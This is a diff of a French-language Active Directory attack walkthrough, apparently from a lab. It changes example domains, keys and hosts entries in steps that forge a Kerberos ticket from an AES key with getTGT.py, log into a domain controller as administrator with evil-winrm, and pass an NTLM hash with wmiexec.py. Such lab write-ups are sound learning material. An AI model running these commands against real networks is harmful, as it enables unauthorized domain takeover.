@@ -423,22 +423,19 @@ La commande suivante permet de générer un ticket kerberos à partir de cette c
 Exemple :
 
 ```shell
-    getTGT.py -aesKey 633c7562bd5ba07fe8c4c1377e425b7f2321b888d1062a3eea6faa56c699bdb8 ROME.LOCAL/Administrator
+    getTGT.py -aesKey 1d746375979dc78aa5e51dd5c814a439758e36fbaa4d56473be698d7a53847d2 mgmgrand.local/administrator
 ```
 Le ticket Kerberos généré à partir de la clé du compte $USER sera enregistrer dans un fichier $USER.ccache.
 
 La prochaine étape consiste à exporter le ticket généré dans notre environnement afin de pouvoir l'utiliser facilement
 
 ```shell
-    export KRB5CCNAME=./Administrator.ccache 
+    export KRB5CCNAME=./administrator.ccache 
 ```
 
 Verification
 
-```shell
-    echo $KRB5CCNAME
-```
-or 
+
 ```shell
     klist
 ```
@@ -446,23 +443,29 @@ OutPut
 ```shell
     ./Administrator.ccache
 ```
+
 Avant de pouvoir se connecter à l'AD cible il faut l'ajouter à la liste des hosts sur la machine attaquante (pas le docker)
 ```shell
-    nano /etc/host
+    cat /etc/host
+
+    ·
+    127.0.0.1       exegol-ad                                                                                                                                       │·················································
+    10.8.2.1        mgmgrand.local                                                                                                                                  │·················································
+    10.8.2.1        WINDOWS-R5KU10Q.mgmgrand.local  WINDOWS-R5KU10Q
+
+cat /etc/resolv.conf
+
+nameserver 10.8.2.1 
+
 ```
-et y ajouter quelque chose comme ceci :
-```shell
-    IP DNS.NAME NAME
-```
-Exemple
-```shell
-    10.10.10.168 ATHENA.ROME.LOCAL ATHENA
-```
+
 Maintenant on peut se connecter avec winrm sur l'AD en tant qu'Administrator grâce au ticket qu'on a généré.
 
 ```shell
-    evil-winrm -i ATHENA.ROME.LOCAL -u Administrator -r ROME.LOCAL
+     evil-winrm -i WINDOWS-R5KU10Q.mgmgrand.local -u administrator -r mgmgrand.local 
 ```
+
+
 Note : on peut aussi se connecter via WMI directement en faisant un PASS THE HASH avec le hash ntlm
 ```shell
     wmiexec.py ROME.LOCAL/Administrator@10.10.10.168 -hashes :d6f22bdacd93357020c9ecc5eb0fd329
